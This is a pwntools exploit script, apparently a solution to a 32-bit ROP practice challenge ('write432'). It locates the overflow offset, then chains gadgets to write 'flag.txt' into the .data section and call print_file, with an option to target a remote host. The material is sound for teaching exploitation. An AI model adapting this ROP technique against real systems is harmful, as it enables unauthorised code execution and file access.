#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.pc)
    return ip_offset

exe = './write432'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

# crafting the payload
offset = find_offset(cyclic(100))
info(f"Offset: {offset:x}")

data_section = elf.get_section_by_name('.data').header.sh_addr
info(f"Data Section: {data_section}")

pop_gadget = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
info(f"Pop Gadget: {pop_gadget}")

payload = flat({ offset: [
        pop_gadget,
        data_section,
        b'flag',
        elf.symbols.usefulGadgets,
        pop_gadget,
        data_section + 0x04,
        b'.txt',
        elf.symbols.usefulGadgets,
        elf.symbols.print_file,
        elf.symbols.main,
        data_section
    ] })
write('payload', payload)
info(f"Payload: {payload}")

# executing exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
